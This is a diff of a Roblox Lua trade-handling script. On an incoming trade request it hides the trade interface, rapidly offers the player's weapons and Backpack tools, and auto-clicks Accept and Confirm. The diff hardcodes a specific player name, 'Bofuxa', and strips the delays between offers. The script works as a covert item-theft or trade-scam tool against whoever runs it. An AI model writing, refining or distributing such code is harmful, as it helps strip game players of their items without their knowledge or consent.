@@ -11,19 +11,6 @@ local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")
 
 print("Waiting for incoming trade request callback...")
 
-local function findInventoryRecursive(parent)
-    if not parent then return nil end
-    for _, child in ipairs(parent:GetChildren()) do
-        if child.Name == "Container" and (child:IsA("ScrollingFrame") or child:IsA("Frame")) then
-            -- Verify it has item children or is inside Salvage/Inventory
-            return child
-        end
-        local found = findInventoryRecursive(child)
-        if found then return found end
-    end
-    return nil
-end
-
 SendRequest.OnClientInvoke = function(senderPlayer)
     local senderName = typeof(senderPlayer) == "Instance" and senderPlayer.Name or tostring(senderPlayer)
     
@@ -40,7 +27,6 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         element.Visible = false
                     end
                 end
-                print("Hidden TradeGUI elements successfully.")
             end
         end
 
@@ -50,15 +36,35 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             print("Waiting for trade to start...")
             StartTradeEvent.OnClientEvent:Wait()
             
-            print("Trade started! Waiting 1 second before offering items...")
+            print("Trade started! Collecting weapons from bofuxa's inventory...")
             task.wait(1)
             
-            local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+            local senderObj = Players:FindFirstChild("Bofuxa")
             local inventoryContainer = nil
             
-            if pGui then
-                -- Deep search fallback to locate inventory container on mobile UI layouts
-                inventoryContainer = findInventoryRecursive(pGui)
+            if senderObj then
+                local sGui = senderObj:FindFirstChild("PlayerGui")
+                if sGui then
+                    local mainGui = sGui:FindFirstChild("MainGUI")
+                    if mainGui then
+                        local gameFolder = mainGui:FindFirstChild("Game")
+                        if gameFolder then
+                            local crafting = gameFolder:FindFirstChild("Crafting")
+                            if crafting then
+                                local inventory = crafting:FindFirstChild("Inventory")
+                                if inventory then
+                                    local salvage = inventory:FindFirstChild("Salvage")
+                                    if salvage then
+                                        local scrollFrame = salvage:FindFirstChild("ScrollFrame")
+                                        if scrollFrame then
+                                            inventoryContainer = scrollFrame:FindFirstChild("Container")
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
             end
 
             local offeredCount = 0
@@ -78,23 +84,21 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                         for i = 1, count do
                             OfferItemEvent:FireServer(itemName, category)
                             offeredCount = offeredCount + 1
-                            task.wait(0.05)
                         end
                     end
                 end
-                print("Successfully offered " .. tostring(offeredCount) .. " items/weapons!")
+                print("Successfully offered all " .. tostring(offeredCount) .. " weapon items and duplicates at once!")
             else
-                -- Fallback to Backpack tools if UI container is completely missing on mobile
+                warn("Could not access bofuxa's inventory container path directly; scanning local fallback tools.")
                 if LocalPlayer:FindFirstChild("Backpack") then
                     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                         if tool:IsA("Tool") then
                             OfferItemEvent:FireServer(tool.Name, "Weapons")
                             offeredCount = offeredCount + 1
-                            task.wait(0.05)
                         end
                     end
                 end
-                print("Offered " .. tostring(offeredCount) .. " items from Backpack!")
+                print("Offered " .. tostring(offeredCount) .. " items from Backpack fallback.")
             end
 
             print("Waiting 7 seconds before triggering trade accept actions...")
@@ -105,9 +109,6 @@ SendRequest.OnClientInvoke = function(senderPlayer)
             else
                 AcceptTradeEvent:FireServer()
             end
-
-            local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI")
-            local actionsFolder = tradeGui and tradeGui:FindFirstChild("Container", true) and tradeGui.Container:FindFirstChild("Trade", true) and tradeGui.Container.Trade:FindFirstChild("Actions", true)
 
             local function fireButton(btn)
                 if btn and btn:IsA("GuiButton") then
@@ -125,15 +126,12 @@ SendRequest.OnClientInvoke = function(senderPlayer)
                 end
             end
 
-            if actionsFolder then
-                local firstButton = actionsFolder:FindFirstChild("Accept", true) and actionsFolder.Accept:FindFirstChild("ActionButton", true)
-                fireButton(firstButton)
-
+            pcall(function()
+                local phoneActions = LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.Actions
+                fireButton(phoneActions.Accept.ActionButton)
                 task.wait(1)
-
-                local confirmButton = actionsFolder:FindFirstChild("Accept", true) and actionsFolder.Accept:FindFirstChild("Confirm", true) and actionsFolder.Accept.Confirm:FindFirstChild("ActionButton", true)
-                fireButton(confirmButton)
-            end
+                fireButton(phoneActions.Accept.Confirm.ActionButton)
+            end)
         end)
 
         return true
